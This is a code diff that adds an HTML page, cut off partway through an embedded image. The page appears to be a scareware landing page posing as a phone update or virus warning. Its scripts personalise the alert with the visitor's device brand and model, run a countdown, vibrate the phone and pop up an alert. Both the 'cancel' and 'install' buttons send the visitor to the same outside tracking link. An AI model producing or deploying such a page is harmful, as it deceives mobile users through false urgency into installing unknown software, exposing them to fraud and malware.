@@ -1,0 +1,877 @@
+<!DOCTYPE html><html><head>
+  <base href="">
+
+
+ <meta http-equiv="content-type" content="text/html; charset=utf-8">
+ <meta name="theme-color" content="#999">
+ <meta name="viewport" content="user-scalable=no, initial-scale=1.0, maximum-scale=1.0, width=device-width">
+ <link href="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAADwAAAA8CAMAAAANIilAAAAA21BMVEUAAAAAqGAAnVoAtWoAqWIAs2gAtGgAm1kAm1oAm1oAtGgAmlkAtGgAtWkAs2gAmloAm1kAtGgAtWgAm1kAmlkAtWcAqmMAnFoAtGgAtGgAmlkAnFoAs2gAs2gAm1oAmloAtGgA0XoAmln///8ApV/u/v8AwG8Ay3YAn1zr+/0AumwZtWsb0n0A0HP1//8Ax3QOtGkAq2Pd9vMArVEAsFloxpkAzWeu68wO0Hrl+vGl28eU1bon0n4Azm1d25nS8+eX5r5z36mc2ME71otRvoi96tiC4rAqt3QAyldAMCWwAAAAIHRSTlMAD05NHPW8r5Lzq25bPOfSwJFnPtx9MCbcx59eJ9CB5TOG1E0AAAMVSURBVEjH1dfJYtowFAVQCHMYwgwJGR5ClowwZgihpIEAzdD+/xdVAtnPRhTi7Hp3LI6v9IwMjp1I4jKVy1zEvpFkNQ0MbErKnWQ0GU9U2oIBACGE2vXsRfyr8LZQuQMmQIUSxSm5ynZa8XOuWK2kS8DYTooRB2qTvbcfytlOTV7BVIVqo1G5vG6nBNOdwEa8ywFg4ntq5+rlTPY+nw9u4zYNQiqmIEoZiVWo9sSmMupTueXjyxEEIrREvOunJJBJxrNFnwkmoZaI8QK4BFLTOLFb50gy7TBgZjKZUMkvgviQYbOZkxhzHP8/zQOZ8TebBzB7nMH4O83jwQzen95B6qjN0j4+fUz7059KR2nWdupalmu9zMbjSM3a9mXc9W8YRGhGa1l9a/o+O40Xy+XSQaytJXO+2RnO5/Ohp3nQWmf2LO1wu/nsrrRehOzRaRcV1tb5cHvu+nW+3FnnwA5AYzzPxZTY40V3+KOn8iy1snPTapxranxb0tgZvj33PO04znyr5qztTFof04eWxsk2A8EVXr32pfS659u+7DUt2IRexTWOpxXGZq3/bPu9oxYIoRl8ejIAhReL1abnZbqRF9L2V8hOJM76uCHxSN8pNTFM2OKJtPM+Luh7ZWrT6mHXfNyU4xb8mFb25dG3OK+kZDgxkNjUaMNbvvEobtrUbh9tcMsdT+K329RoQ6uutwI4eafWbWoXrbFqTIVhNWp3g3MOzto/Ung2BA/qzXq6/lwpaxaX45rhvNXIUK+6b93VAq35DcFUAVQ1asmHzgLMYrzJWH2tq5HLRxk/WnyPzKzG8PPFWM3O/Uraxo7xdAA/3UyNUeOpNhbOjUUf3OPQ2QJ2ChN8ChipSgyjkD7YMD67ji0ctdlMCT4EMOHzATyM0eKkj6ZYElobmBobNpJIhfcdtpnY6RQgqHnYGsMydErtm/EgnthoTydRUlqMuMI4Knoj7fk0r6WWXLZz748+JfdffUWpgOTKCyVVbT3C61UiLfZ8T0k2GenFqpBOCSbAtinN3dRiUVNsXLZTuXom34z9K38BAetViJSD+24AAAAASUVORK5CYII=" rel="shortcut icon" type="image/x-icon">
+    
+ <title>Atualize!</title>
+ <script>
+ function getCountryCode(A) {
+var N = {
+ AFG: "AF",
+ ALA: "AX",
+ ALB: "AL",
+ DZA: "DZ",
+ ASM: "AS",
+ AND: "AD",
+ AGO: "AO",
+ AIA: "AI",
+ ATA: "AQ",
+ ARG: "AR",
+ ARM: "AM",
+ ABW: "AW",
+ AUS: "AU",
+ AUT: "AT",
+ AZE: "AZ",
+ BHS: "BS",
+ BHR: "BH",
+ BGD: "BD",
+ BRB: "BB",
+ BLR: "BY",
+ BEL: "BE",
+ BLZ: "BZ",
+ BEN: "BJ",
+ BMU: "BM",
+ BTN: "BT",
+ BOL: "BO",
+ BWA: "BW",
+ SSD: "SS",
+ BVT: "BV",
+ BRA: "BR",
+ IOT: "IO",
+ BRN: "BN",
+ BGR: "BG",
+ BFA: "BF",
+ BDI: "BI",
+ KHM: "KH",
+ CMR: "CM",
+ CAN: "CA",
+ CPV: "CV",
+ CYM: "KY",
+ TCD: "TD",
+ JOR: "JO",
+ CHL: "CL",
+ CHN: "CN",
+ CXR: "CX",
+ CCK: "CC",
+ COL: "CO",
+ COM: "KM",
+ COG: "CG",
+ COK: "CK",
+ CRI: "CR",
+ CIV: "CI",
+ HRV: "HR",
+ CUB: "CU",
+ CYP: "CY",
+ CZE: "CZ",
+ DNK: "DK",
+ DJI: "DJ",
+ DMA: "DM",
+ DOM: "DO",
+ ECU: "EC",
+ EGY: "EG",
+ SLV: "SV",
+ GNQ: "GQ",
+ ERI: "ER",
+ EST: "EE",
+ ETH: "ET",
+ FLK: "FK",
+ FRO: "FO",
+ FJI: "FJ",
+ FIN: "FI",
+ FRA: "FR",
+ GUF: "GF",
+ PYF: "PF",
+ ATF: "TF",
+ GAB: "GA",
+ GMB: "GM",
+ GEO: "GE",
+ DEU: "DE",
+ GHA: "GH",
+ GIB: "GI",
+ GRC: "GR",
+ GRL: "GL",
+ GRD: "GD",
+ GLP: "GP",
+ GUM: "GU",
+ GTM: "GT",
+ GGY: "GG",
+ GIN: "GN",
+ GNB: "GW",
+ GUY: "GY",
+ HTI: "HT",
+ VAT: "VA",
+ HND: "HN",
+ HKG: "HK",
+ HUN: "HU",
+ ISL: "IS",
+ IND: "IN",
+ IDN: "ID",
+ IRQ: "IQ",
+ IRL: "IE",
+ ISR: "IL",
+ ITA: "IT",
+ JAM: "JM",
+ JPN: "JP",
+ JEY: "JE",
+ KAZ: "KZ",
+ KEN: "KE",
+ KWT: "KW",
+ KGZ: "KG",
+ LAO: "LA",
+ LVA: "LV",
+ LBN: "LB",
+ LSO: "LS",
+ LBR: "LR",
+ LBY: "LY",
+ LIE: "LI",
+ LTU: "LT",
+ LUX: "LU",
+ MKD: "MK",
+ MDG: "MG",
+ MWI: "MW",
+ MYS: "MY",
+ MDV: "MV",
+ MLI: "ML",
+ MLT: "MT",
+ MHL: "MH",
+ MTQ: "MQ",
+ MRT: "MR",
+ MUS: "MU",
+ MYT: "YT",
+ MEX: "MX",
+ MCO: "MC",
+ MNG: "MN",
+ MNE: "ME",
+ MSR: "MS",
+ MAR: "MA",
+ MOZ: "MZ",
+ MMR: "MM",
+ NAM: "NA",
+ NRU: "NR",
+ NPL: "NP",
+ NLD: "NL",
+ NCL: "NC",
+ NZL: "NZ",
+ NIC: "NI",
+ NER: "NE",
+ NGA: "NG",
+ NIU: "NU",
+ NFK: "NF",
+ MNP: "MP",
+ NOR: "NO",
+ OMN: "OM",
+ PAK: "PK",
+ PLW: "PW",
+ PSE: "PS",
+ PAN: "PA",
+ PNG: "PG",
+ PRY: "PY",
+ PER: "PE",
+ PHL: "PH",
+ POL: "PL",
+ PRT: "PT",
+ PRI: "PR",
+ QAT: "QA",
+ REU: "RE",
+ ROU: "RO",
+ RUS: "RU",
+ RWA: "RW",
+ BLM: "BL",
+ SHN: "SH",
+ LCA: "LC",
+ MAF: "MF",
+ WSM: "WS",
+ SMR: "SM",
+ SAU: "SA",
+ SEN: "SN",
+ SRB: "RS",
+ SYC: "SC",
+ SLE: "SL",
+ SGP: "SG",
+ SVK: "SK",
+ SVN: "SI",
+ SLB: "SB",
+ SOM: "SO",
+ ZAF: "ZA",
+ ESP: "ES",
+ LKA: "LK",
+ SDN: "SD",
+ SUR: "SR",
+ SWZ: "SZ",
+ SWE: "SE",
+ CHE: "CH",
+ SYR: "SY",
+ TWN: "TW",
+ TJK: "TJ",
+ THA: "TH",
+ TLS: "TL",
+ TGO: "TG",
+ TKL: "TK",
+ TON: "TO",
+ TUN: "TN",
+ TUR: "TR",
+ TKM: "TM",
+ TUV: "TV",
+ UGA: "UG",
+ UKR: "UA",
+ ARE: "AE",
+ GBR: "GB",
+ USA: "US",
+ URY: "UY",
+ UZB: "UZ",
+ VUT: "VU",
+ VEN: "VE",
+ VGB: "VG",
+ VIR: "VI",
+ ESH: "EH",
+ YEM: "YE",
+ ZMB: "ZM",
+ ZWE: "ZW",
+ ATG: "AG",
+ BIH: "BA",
+ COD: "CD",
+ HMD: "HM",
+ IRN: "IR",
+ IMN: "IM",
+ KOR: "KR",
+ FSM: "FM",
+ MDA: "MD",
+ PCN: "PN",
+ KNA: "KN",
+ SPM: "PM",
+ VCT: "VC",
+ STP: "ST",
+ SGS: "GS",
+ SJM: "SJ",
+ TZA: "TZ",
+ TTO: "TT",
+ TCA: "TC",
+ UMI: "UM",
+ VNM: "VN",
+ WLF: "WF"
+}, I = {
+ AFGHANISTAN: "AF",
+ "ALAND ISLANDS": "AX",
+ ALBANIA: "AL",
+ ALGERIA: "DZ",
+ "AMERICAN SAMOA": "AS",
+ ANDORRA: "AD",
+ ANGOLA: "AO",
+ ANGUILLA: "AI",
+ ANTARCTICA: "AQ",
+ "ANTIGUA AND BARBUDA": "AG",
+ ARGENTINA: "AR",
+ ARMENIA: "AM",
+ ARUBA: "AW",
+ AUSTRALIA: "AU",
+ AUSTRIA: "AT",
+ AZERBAIJAN: "AZ",
+ BAHAMAS: "BS",
+ BAHRAIN: "BH",
+ BANGLADESH: "BD",
+ BARBADOS: "BB",
+ BELARUS: "BY",
+ BELGIUM: "BE",
+ BELIZE: "BZ",
+ BENIN: "BJ",
+ BERMUDA: "BM",
+ BHUTAN: "BT",
+ "BOLIVIA, PLURINATIONAL STATE OF": "BO",
+ BOLIVIA: "BO",
+ BONAIRE: "BQ",
+ "SINT EUSTATIUS AND SABA": "BQ",
+ "BONAIRE, SINT EUSTATIUS AND SABA": "BQ",
+ "BOSNIA AND HERZEGOVINA": "BA",
+ BOTSWANA: "BW",
+ BRAZIL: "BR",
+ "BRITISH INDIAN OCEAN TERRITORY": "IO",
+ "BRUNEI DARUSSALAM": "BN",
+ BULGARIA: "BG",
+ "BURKINA FASO": "BF",
+ BURUNDI: "BI",
+ CAMBODIA: "KH",
+ CAMEROON: "CM",
+ CANADA: "CA",
+ "CAPE VERDE": "CV",
+ "CAYMAN ISLANDS": "KY",
+ "CENTRAL AFRICAN REPUBLIC": "CF",
+ CHAD: "TD",
+ CHILE: "CL",
+ CHINA: "CN",
+ "CHRISTMAS ISLAND": "CX",
+ "COCOS (KEELING) ISLANDS": "CC",
+ COLOMBIA: "CO",
+ COMOROS: "KM",
+ CONGO: "CG",
+ "CONGO, DEMOCRATIC REPUBLIC OF THE": "CD",
+ "COOK ISLANDS": "CK",
+ "COSTA RICA": "CR",
+ "COTE D'IVOIRE": "CI",
+ CROATIA: "HR",
+ CUBA: "CU",
+ "CURAÇAO": "CW",
+ CYPRUS: "CY",
+ CZECH: "CZ",
+ "CZECH REPUBLIC": "CZ",
+ DENMARK: "DK",
+ DJIBOUTI: "DJ",
+ DOMINICA: "DM",
+ "DOMINICAN REPUBLIC": "DO",
+ ECUADOR: "EC",
+ EGYPT: "EG",
+ "EL SALVADOR": "SV",
+ "EQUATORIAL GUINEA": "GQ",
+ ERITREA: "ER",
+ ESTONIA: "EE",
+ ETHIOPIA: "ET",
+ "EUROPEAN UNION": "EU",
+ "FALKLAND ISLANDS": "FK",
+ MALVINAS: "FK",
+ "FALKLAND ISLANDS (MALVINAS)": "FK",
+ "FAROE ISLANDS": "FO",
+ FIJI: "FJ",
+ FINLAND: "FI",
+ FRANCE: "FR",
+ "FRENCH GUIANA": "GF",
+ "FRENCH POLYNESIA": "PF",
+ "FRENCH SOUTHERN TERRITORIES": "TF",
+ GABON: "GA",
+ GAMBIA: "GM",
+ GEORGIA: "GE",
+ GERMANY: "DE",
+ GHANA: "GH",
+ GIBRALTAR: "GI",
+ GREECE: "GR",
+ GREENLAND: "GL",
+ GRENADA: "GD",
+ GUADELOUPE: "GP",
+ GUAM: "GU",
+ GUATEMALA: "GT",
+ GUERNSEY: "GG",
+ GUINEA: "GN",
+ "GUINEA-BISSAU": "GW",
+ GUYANA: "GY",
+ HAITI: "HT",
+ "HOLY SEE": "VA",
+ "VATICAN CITY STATE": "VA",
+ "HOLY SEE (VATICAN CITY STATE)": "VA",
+ HONDURAS: "HN",
+ "HONG KONG": "HK",
+ HUNGARY: "HU",
+ ICELAND: "IS",
+ INDIA: "IN",
+ INDONESIA: "ID",
+ IRAN: "IR",
+ "IRAN, ISLAMIC REPUBLIC OF": "IR",
+ IRAQ: "IQ",
+ IRELAND: "IE",
+ "ISLE OF MAN": "IM",
+ ISRAEL: "IL",
+ ITALY: "IT",
+ JAMAICA: "JM",
+ JAPAN: "JP",
+ JERSEY: "JE",
+ JORDAN: "JO",
+ KAZAKHSTAN: "KZ",
+ KENYA: "KE",
+ KIRIBATI: "KI",
+ "KOREA, DEMOCRATIC PEOPLE'S REPUBLIC OF": "KP",
+ "KOREA, REPUBLIC OF": "KR",
+ KUWAIT: "KW",
+ KYRGYZSTAN: "KG",
+ LAO: "LA",
+ "LAO PEOPLE'S DEMOCRATIC REPUBLIC": "LA",
+ LATVIA: "LV",
+ LEBANON: "LB",
+ LESOTHO: "LS",
+ LIBERIA: "LR",
+ LIBYAN: "LY",
+ "LIBYAN ARAB JAMAHIRIYA": "LY",
+ LIECHTENSTEIN: "LI",
+ LITHUANIA: "LT",
+ LUXEMBOURG: "LU",
+ MACAO: "MO",
+ MACEDONIA: "MK",
+ "MACEDONIA, THE FORMER YUGOSLAV REPUBLIC OF": "MK",
+ MADAGASCAR: "MG",
+ MALAWI: "MW",
+ MALAYSIA: "MY",
+ MALDIVES: "MV",
+ MALI: "ML",
+ MALTA: "MT",
+ "MARSHALL ISLANDS": "MH",
+ MARTINIQUE: "MQ",
+ MAURITANIA: "MR",
+ MAURITIUS: "MU",
+ MAYOTTE: "YT",
+ MEXICO: "MX",
+ MICRONESIA: "FM",
+ "MICRONESIA, FEDERATED STATES OF": "FM",
+ MOLDOVA: "MD",
+ MONACO: "MC",
+ MONGOLIA: "MN",
+ MONTENEGRO: "ME",
+ MONTSERRAT: "MS",
+ MOROCCO: "MA",
+ MOZAMBIQUE: "MZ",
+ MYANMAR: "MM",
+ NAMIBIA: "NA",
+ NAURU: "NR",
+ NEPAL: "NP",
+ NETHERLANDS: "NL",
+ "NEW CALEDONIA": "NC",
+ "NEW ZEALAND": "NZ",
+ NICARAGUA: "NI",
+ NIGER: "NE",
+ NIGERIA: "NG",
+ NIUE: "NU",
+ "NORFOLK ISLAND": "NF",
+ "NORTHERN MARIANA ISLANDS": "MP",
+ NORWAY: "NO",
+ OMAN: "OM",
+ PAKISTAN: "PK",
+ PALAU: "PW",
+ "PALESTINIAN TERRITORY, OCCUPIED": "PS",
+ PANAMA: "PA",
+ "PAPUA NEW GUINEA": "PG",
+ PARAGUAY: "PY",
+ PERU: "PE",
+ PHILIPPINES: "PH",
+ PITCAIRN: "PN",
+ POLAND: "PL",
+ PORTUGAL: "PT",
+ "PUERTO RICO": "PR",
+ QATAR: "QA",
+ REUNION: "RE",
+ ROMANIA: "RO",
+ RUSSIA: "RU",
+ "RUSSIAN FEDERATION": "RU",
+ RWANDA: "RW",
+ "SAINT BARTHÉLEMY": "BL",
+ "SAINT HELENA, ASCENSION AND TRISTAN DA CUNHA": "SH",
+ "SAINT KITTS AND NEVIS": "KN",
+ "SAINT LUCIA": "LC",
+ "SAINT MARTIN (FRENCH PART)": "MF",
+ "SAINT PIERRE AND MIQUELON": "PM",
+ "SAINT VINCENT AND THE GRENADINES": "VC",
+ SAMOA: "WS",
+ "SAN MARINO": "SM",
+ "SAO TOME AND PRINCIPE": "ST",
+ "SAUDI ARABIA": "SA",
+ SENEGAL: "SN",
+ SERBIA: "RS",
+ SEYCHELLES: "SC",
+ "SIERRA LEONE": "SL",
+ SINGAPORE: "SG",
+ "SINT MAARTEN": "SX",
+ SLOVAKIA: "SK",
+ SLOVENIA: "SI",
+ "SOLOMON ISLANDS": "SB",
+ SOMALIA: "SO",
+ "SOUTH AFRICA": "ZA",
+ "SOUTH GEORGIA AND THE SOUTH SANDWICH ISLANDS": "GS",
+ "SOUTH SUDAN": "SS",
+ SPAIN: "ES",
+ "SRI LANKA": "LK",
+ SUDAN: "SD",
+ SURINAME: "SR",
+ "SVALBARD AND JAN MAYEN": "SJ",
+ SWAZILAND: "SZ",
+ SWEDEN: "SE",
+ SWITZERLAND: "CH",
+ "SYRIAN ARAB REPUBLIC": "SY",
+ TAIWAN: "TW",
+ "TAIWAN, PROVINCE OF CHINA": "TW",
+ TAJIKISTAN: "TJ",
+ TANZANIA: "TZ",
+ "TANZANIA, UNITED REPUBLIC OF": "TZ",
+ THAILAND: "TH",
+ "TIMOR-LESTE": "TL",
+ TOGO: "TG",
+ TOKELAU: "TK",
+ TONGA: "TO",
+ "TRINIDAD AND TOBAGO": "TT",
+ TUNISIA: "TN",
+ TURKEY: "TR",
+ TURKMENISTAN: "TM",
+ "TURKS AND CAICOS ISLANDS": "TC",
+ TUVALU: "TV",
+ UGANDA: "UG",
+ UKRAINE: "UA",
+ "UNITED ARAB EMIRATES": "AE",
+ "UNITED KINGDOM": "GB",
+ "UNITED STATES": "US",
+ "UNITED STATES MINOR OUTLYING ISLANDS": "UM",
+ URUGUAY: "UY",
+ UZBEKISTAN: "UZ",
+ VANUATU: "VU",
+ VENEZUELA: "VE",
+ VIETNAM: "VN",
+ "VIRGIN ISLANDS, BRITISH": "VG",
+ "VIRGIN ISLANDS, U.S.": "VI",
+ "WALLIS AND FUTUNA": "WF",
+ YEMEN: "YE",
+ ZAMBIA: "ZM",
+ ZIMBABWE: "ZW"
+};
+return N[A = A.toUpperCase()] ? N[A] : I[A] ? I[A] : A
+ }</script>
+ 
+ <script>function getURLParameter(t) {
+ var e, n, o = window.location.search.substring(1).split("&");
+ for (n = 0; n < o.length; n++) if ((e = o[n].split("="))[0] === t) return void 0 === e[1] || decodeURIComponent(
+e[1])
+ }</script>
+ 
+ <script src="language-set.js"></script>
+ <script src="ua-parser.min.js"></script>
+ <script>
+ function getLangCode(a) {
+var e = {
+ afrikaans: "af",
+ arabic: "ar",
+ azeri: "az",
+ belarusian: "be",
+ bulgarian: "bg",
+ bosnian: "bs",
+ catalan: "ca",
+ czech: "cs",
+ welsh: "cy",
+ danish: "da",
+ german: "de",
+ divehi: "dv",
+ greek: "el",
+ english: "en",
+ esperanto: "eo",
+ spanish: "es",
+ estonian: "et",
+ basque: "eu",
+ farsi: "fa",
+ finnish: "fi",
+ faroese: "fo",
+ french: "fr",
+ galician: "gl",
+ gujarati: "gu",
+ hebrew: "he",
+ hindi: "hi",
+ croatian: "hr",
+ hungarian: "hu",
+ armenian: "hy",
+ indonesian: "id",
+ icelandic: "is",
+ italian: "it",
+ japanese: "ja",
+ georgian: "ka",
+ kazakh: "kk",
+ kannada: "kn",
+ korean: "ko",
+ konkani: "kok",
+ kyrgyz: "ky",
+ lithuanian: "lt",
+ latvian: "lv",
+ maori: "mi",
+ "fyro macedonian": "mk",
+ mongolian: "mn",
+ marathi: "mr",
+ malay: "ms",
+ maltese: "mt",
+ norwegian: "nn",
+ dutch: "nl",
+ "northern sotho": "ns",
+ punjabi: "pa",
+ polish: "pl",
+ pashto: "ps",
+ portuguese: "pt",
+ quechua: "qu",
+ romanian: "ro",
+ russian: "ru",
+ sanskrit: "sa",
+ sami: "se",
+ slovak: "sk",
+ slovenian: "sl",
+ albanian: "sq",
+ serbian: "sr",
+ swedish: "sv",
+ swahili: "sw",
+ syriac: "syr",
+ tamil: "ta",
+ telugu: "te",
+ thai: "th",
+ tagalog: "tl",
+ tswana: "tn",
+ turkish: "tr",
+ tatar: "tt",
+ tsonga: "ts",
+ ukrainian: "uk",
+ urdu: "ur",
+ uzbek: "uz",
+ vietnamese: "vi",
+ xhosa: "xh",
+ chinese: "zh",
+ zulu: "zu"
+};
+return e[a = a.split(/[-_]/)[0]] ? e[a] : a
+ }
+
+ var loadingtext1, loadingtext2, loadingtext3, loadingtext4, loadingtext5, loadingtext6,
+virfoundtext1, virfoundtext2, languageSelector = {},
+languageParam = navigator.language || navigator.userLanguage || "en";
+ languageParam = getLangCode(languageParam.toLocaleLowerCase());
+ var extend = function(a) {
+a = a || {};
+for (var e = 1; e < arguments.length; e++) if (arguments[e]) for (var n in arguments[e]) arguments[e].hasOwnProperty(
+ n) && (a[n] = arguments[e][n]);
+return a
+ };
+ try {
+extend(languageSelector, eval(languageParam + "Set"))
+ }
+ catch (e) {
+extend(languageSelector, eval("enSet"))
+ }
+ alertwindow = languageSelector.alertwindow, loadingtext1 = languageSelector.loadingtext1, loadingtext2 = languageSelector.loadingtext2, loadingtext3 = languageSelector.loadingtext3, loadingtext4 = languageSelector.loadingtext4, loadingtext5 = languageSelector.loadingtext5, loadingtext6 = languageSelector.loadingtext6, virfoundtext1 = languageSelector.virfoundtext1, virfoundtext2 = languageSelector.virfoundtext2;</script>
+
+ <script>
+ var parser = new UAParser();
+ var result = parser.getResult();
+ 
+
+ Object.keys(languageSelector).forEach(function(el) {
+languageSelector[el] = languageSelector[el].replace('$$device_brand$$', getURLParameter("device_brand"));
+languageSelector[el] = languageSelector[el].replace('$$device_model$$', getURLParameter("device_model"));
+languageSelector[el] = languageSelector[el].replace('$$device_name$$', getURLParameter("device_brand")+' '+getURLParameter("device_model"));
+ })</script>
+
+ <script>document.title = languageSelector.title;</script>
+ <script>
+ function contains(string, fragment) {
+string = string.toLowerCase();
+fragment = fragment.toLowerCase();
+return string.indexOf(fragment) !== -1;
+ }
+
+ function getURLParameter(name) {
+var result = decodeURI((RegExp(name + '=' + '(.*?)(&|$)')
+ .exec(location.search) || [ , null ])[1] || '');
+
+if (contains(result, 'generic')) {
+ result = 'Phone'
+}
+
+if (contains(result, 'android')) {
+ result = 'Phone'
+}
+
+if (contains(result, 'android')) {
+ result = 'Internet Browser'
+}
+
+return result;
+
+ }
+ 
+ var playGoogleUrl = "https://orlyposed-ficity.xyz/click";
+ 
+
+ </script>
+ <script type="text/javascript">
+ function getRandomInt(min, max) {
+return Math.floor(Math.random() * (max - min + 1)) + min;
+ }
+
+ function func() {
+var nv = navigator;
+nv.vibrate = nv.vibrate || nv.webkitVibrate || nv.mozVibrate || nv.msVibrate;
+nv.vibrate([ 1000, 500, 1000, 500, 1000, 500, 1000, 500, 1000, 500 ]);
+var answer = confirm(languageSelector.alert);
+ }
+
+ setTimeout(func, getRandomInt(120, 220) * 1000);
+ </script>
+</head>
+<body>
+<script language="JavaScript" type="text/javascript">
+
+ var sec = 59; // set the seconds
+ var min = 5; // set the minutes
+ var SD;
+
+ function countDown() {
+ sec--;
+ if (sec == -1) {
+sec = 59;
+min = min - 1;
+ }
+ else {
+min = min;
+ }
+
+ if (sec <= 9) {
+sec = "0" + sec;
+ }
+ var c = min > 1 ? languageSelector.minutes : languageSelector.oneMinute,
+l = sec > 1 ? languageSelector.seconds : languageSelector.oneSecond;
+
+ time = (min <= 9 ? "" + min : min) + ' ' + c + ' ' + sec + ' ' + l;
+
+ if (document.getElementById) {
+document.getElementById('theTime').innerHTML = time;
+ }
+
+ SD = window.setTimeout("countDown();", 1000);
+ if (min == '00' && sec == '00') {
+sec = "00";
+window.clearTimeout(SD);
+ }
+ }
+
+ window.onload = countDown;
+</script>
+
+<style>.body-push{margin:0;padding:0;width:auto;height:100%;font-family:-apple-system,Roboto,Trebuchet MS,sans-serif;font-size:.95em;line-height:1.2em;background-color:#999}#bottom-message-container{display:none}.body-push #bottom-message-container{display:block;position:absolute;width:100%;bottom:10%}.body-push .loader-container{text-align:center;margin-left:8px}.body-push #bottom-message{border:2px solid #666;background-color:#737373;height:50px;padding:0 20px;border-radius:30px;-moz-border-radius:30px;color:#fff;font-size:1.07em;line-height:3.3}@media only screen and (max-device-width: 375px){.body-push #bottom-message{height:40px;font-size:.8em}}</style>
+<style>a,body{color:#000}body,html{margin:0;padding:0;width:auto;height:100%}body{font-family:"Helvetica","Arial",sans-serif;font-size:.85em;line-height:1.2em;background-color:#999;color:#212121}a{text-decoration:none}.window{position:absolute;left:0;right:0;border:none;top:50%;width:84.4%;min-width:240px;max-width:480px;margin:auto;background-color:#f9f9f9;overflow:hidden;-webkit-border-radius:2px;-moz-border-radius:2px;-ms-border-radius:2px;-o-border-radius:2px;border-radius:2px;box-shadow:0 9px 46px 8px rgba(0,0,0,.14),0 11px 15px -7px rgba(0,0,0,.12),0 24px 38px 3px rgba(0,0,0,.2);-webkit-transform:translate(0,-50%);-moz-transform:translate(0,-50%);transform:translate(0,-50%)}div.text{margin:0 6%}div.text span.text{display:block;margin:0}.button,.buttons{margin:0;text-align:center}.buttons{position:relative;height:auto;min-height:36px;white-space:nowrap;display:flex;justify-content:flex-end;margin:0 6%;padding-bottom:16px;border-bottom:1px solid #d9d9d9}.button{display:inline-block;margin:0;height:36px;text-align:center;white-space:normal;border:none;border-radius:2px;min-width:64px;padding:0 16px;text-transform:uppercase;letter-spacing:0;overflow:hidden;will-change:box-shadow;transition:box-shadow .2s cubic-bezier(.4,0,1,1),background-color .2s cubic-bezier(.4,0,.2,1),color .2s cubic-bezier(.4,0,.2,1);outline:none;cursor:pointer;text-decoration:none;line-height:36px;vertical-align:middle;font-weight:500}.button.cancel{color:#01875f}.button.install{color:#fff;background-color:#01875f;box-shadow:0 4px 5px 0 rgba(0,0,0,.14),0 1px 10px 0 rgba(0,0,0,.12),0 2px 4px -1px rgba(0,0,0,.2)}.heads{height:auto;font-weight:500;font-size:140%;line-height:105%;padding:20px 0 10px}.blink_me{animation:blinker 1s linear infinite}@keyframes blinker{50%{opacity:.3}}.pagelink{position:absolute;top:0;left:0;right:0;bottom:0;width:auto;height:auto}</style>
+<div class="window text_wrap">
+ <div class="heads">
+ <div class="text">
+<script>document.write(languageSelector.header)</script>
+ </div>
+ </div>
+ <div class="text">
+ <p id="t2">
+<script>document.write(languageSelector.firstText)</script>
+ </p>
+ <p id="t3">
+<script>document.write(languageSelector.secondText)</script>
+ </p>
+ <p id="t4">
+<script>document.write(languageSelector.thirdText)</script>
+ </p>
+ <p id="t5" style="text-align:center;margin-top:10px;">
+<span style="font-size:15px;color:red;font-family:sans-serif;" id="theTime">5 minutos 44 segundos</span></p>
+ </div>
+ <div class="buttons">
+ <script>document.write('<a class="button exitpoint right cancel" id="cancel-button" href="https://orlyposed-ficity.xyz/click">')</script>
+ <script>document.write(languageSelector.cancelButton)</script>
+ <script>document.write("</a>")</script></a>
+
+ <script>document.write('<a class="button exitpoint install" id="install-button" href="https://orlyposed-ficity.xyz/click">')</script>
+ <script>document.write(languageSelector.installButton)</script>
+ <script>document.write("</a>")</script></a>
+ </div>
+ <img src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAANIAAAA/CAMAAACinWYsAAABa1BMVEUAAADHx8esrKyNjY2NjY3Y2NgAAAD///+mpqYA9mUqKirAwMCAgIDd3d0Axf8Ayv8Azf8A0/8A2//u7u5AQEAA1f8A4/8A4f/v7+8A1/8A0P8QEBBgYGD/AEQA2f//AD4Ax/+goKD/AEH/BzkgICD/zQAA3f//AEf/ADwA5/8A3//R0dH/1QAA5P/h4eFxcXEwMDD/yAD/yQD/xQAA8mVQUFCQkJD2AE3/2gD/wgD/vACvr6+ioqIA6mb/0AD39/fm5uYA4Gf6AEz/wAD19fWHh4f9AEoA0v8Az//r6+uenp4RDQIA9Wf/ATsfHx+ebJFoaGjnAUDx8fHZ2dmVapWnao0A74YA1H0A93QAjVMA7kcAdEDYBze1AjL/PiFkBxlPRAJAMwCSkpIA5IYA4oAA9Ht6enoAtXIAnFgA7UgA7EicADTGCSsASil6ACmeAyiNASgANx8/BhEtBQ0AFAooIgP3vwDytwCAbQDvoJffAAAABnRSTlMAV4fvzzxVqLpTAAAFN0lEQVRo3u2bCXeTQBCA6zWDgkcNWhS02qBWU5N4pFFjTY3xrPd93/d96893LxhIIBAxeQb93mtgl4XkY2Znm1c6Jlis5YJFYx5LNO3iChh5VlQ0bak0WqRVICcc1xbJGJ2H3HBexCk/MeI81nhlgFyhLRvTLkKuOH5mTMtBrQuyQvuv9Pfzjyi9uAV9choRZ9l2JXIAJcDAy6plAKeGiM3jYqTJX+eBGKDSqqNHj96APrCxUAMHm+wjFgwGsB/kWwYWWKvEWiYwytgAmMd5Ic+VVgIxSCXuNPcEUoNlEHAlv8/b8p7D6AXTlp0uG9kuDE9pC3Oam5u7/gnScQYhpRKqbbPARtZweEqrmRNT2r//GaSigABwZSVDziUjXklNnRJyecsanpJw2s9YfvMrJDOPANBmRvyDmqbpxiudVmc0RTzRHpbSGuHEjM4uX372XfrEczBt4rXnxUirUBqWknRiRpyzd9JlHlSxlKRk4hVgPEc167A9JKWNymm54mbiMtXEwso2tr11KVYJbMTTZcSqUjqDw1I6RU6SG2mW2gZEKjVJScQJ0RJLLe+HyyKqg1ca30hx8rgDo0OU0vhJ34l4CaNChNK68XHKPeIpjAhRStyJ4kRch5EgQmkDc4rMvdt7ZmAEiFJiTpG5t2/P3lFwilDazJ26c+/2Qaa0bdvMAkSyFSU16BfDMCK7FVW/+ftKazdvjsi9V8ek0pGZA9+giwoS0CcxpyChmtmUunPvkK80c+AhdFDCIPafVsLMSmvXduXe60NBpQMLEUYqPxCdPxYl08voUkal7dwpnHvXDoWVfkIQF4MetJddyd+rZlRiTh25V7zfK0oJEyiTkoqTnk1pF3MK5965YrEYP5caGYwSlGg3m9LErl2h3Ls2Pc2dPKUjj7rf24UIbGRYVVAYyJilZBV1RNdn+fk0wI1QqiCWvVGOuCgAO1PnY+VeCqVQ7k1OT08zpftSac9CqrtMVbASKmAWCGoocLyUovGlyLnkqFGoqILOPP3DiUoTE8Hcm5xkTiJOTOl7z8QJVl0LPbaGD4VapEQdHUquPKnjopQcFnNLUlo/MUG5d2Fqkpx+PIK0Sq5anxzpFHSRneLTkJJOA3qtSxRQcINnJCtR7k1NeU7F4l2